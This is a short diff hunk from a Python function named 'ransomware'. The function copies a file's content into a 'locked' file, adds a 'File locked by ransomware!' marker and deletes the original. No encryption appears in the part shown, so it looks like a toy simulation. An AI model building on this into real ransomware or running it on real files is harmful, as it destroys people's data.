@@ -17,6 +17,7 @@ def ransomware(file_path):
         with open(locked_file_path, 'w') as locked_file:
             # Store the content of the original file in the locked file
             locked_file.write(file_content)
+            locked_file.write('\nFile locked by ransomware!')
 
     # Delete the original file
     os.remove(file_path)
